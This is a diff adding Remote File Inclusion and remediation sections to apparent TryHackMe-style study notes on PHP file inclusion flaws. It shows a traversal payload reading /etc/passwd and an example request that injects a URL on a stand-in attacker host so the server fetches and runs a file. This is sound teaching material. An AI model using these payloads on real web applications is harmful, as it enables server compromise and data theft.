@@ -90,6 +90,8 @@ Sometimes, developers will only limit access to certain files or directories. Be
 
 LFI attacks against web applications are often due to a developer's lack of security awareness. With PHP, using functions such as `include`, `require`, `include_once`, and `require_once` often lead to vulnerable web applications. Here, we focus our discussion around PHP, but it is worth noting that LFI vulnerabilities can also occur in other languages like ASP, JSP, or even Node.js. LFI exploits follow the same concepts as path traversal.
 
+Below, we look at some scenarios of LFI vunlnerability and how we can exploit them.
+
 ---
 **Scenario 1.**
 
@@ -174,3 +176,36 @@ There may be cases where the developer forces the `include()` function to read f
 
 To exploit it, we can simply include the directory in the usual payload, like so: `languages/../../../../../etc/passwd`.
 
+### Remote File Inclusion (RFI)
+
+RFI is a technique to include remote files into a vulnerable application. Like LFI, RFI vulnerabilities occur when user input is not properly sanitised. Thus, an attacker is able to inject **external URLs** into the `include()` function. 
+
+It is important to note that RFI requires the `allow_url_fopen` option to be set to `true` in the PHP runtime configuration.
+
+The severity of RFI is higher than LFI because RFI vulnerabilities allow an attacker to gain remote code execution (RCE) on the server. Potential consequences include sensitive information disclosure, cross-site scripting (XSS) and denial of service (DoS).
+
+An external server -- where the attacker hosts their malicious files -- must communicate with the application server for a successful RFI attack. The malicious file is then injected via HTTP requests, and the content of the malicious file then executes on the application server.
+
+**Example**
+
+Suppose an attacker hosts a PHP file on their own server at `http://attacker.thm/cmd.txt` with the content:
+
+```php
+<?php echo "Hello THM"; ?>
+```
+
+The attacker makes a request to inject the malicious URL pointing to their server: `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`. If there is no input validation, the malicious URL will pass into the `include()` function. The web server then makes a GET request to the attacker's server to fetch the file. The file's contents are then executed by the application server. 
+
+![Schematic of an RFI attack](./img/rfi_schematics.png "Schematic of an RFI attack")
+
+### Remediation
+
+To prevent file inclusion vulnerabilities, the common recommendations are:
+
+* Keep all systems and services, including web application frameworks updated with the latest version.
+* Turn **off** PHP errors to avoid leaking the path of the application and other potentially revealing information.
+* A *Web Application Firewall* (WAF) is can help to mitigate attacks.
+* Disable PHP features, e.g. `allow_url_fopen` and `allow_url_include` if the web application does not require them.
+* Allow only protocols and PHP wrappers that are needed.
+* Never trust user input and implement proper input validation.
+* Implement white- and black-listing for file names and locations.
